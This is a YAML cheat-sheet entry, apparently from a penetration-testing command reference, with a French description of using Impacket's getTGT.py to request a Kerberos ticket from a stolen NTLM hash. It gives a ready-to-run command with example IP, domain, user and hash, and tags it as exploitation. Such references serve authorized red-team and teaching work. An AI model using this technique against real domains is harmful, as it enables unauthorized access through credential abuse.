---
description: |
  Le fichier getTGT.py d'Impacket utilise le hachage NTLM d'un utilisateur valide pour demander des tickets Kerberos, afin d'accéder à n'importe quel service ou machine où cet utilisateur a des permissions.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

command: |
  python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
items:
  - Hash
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
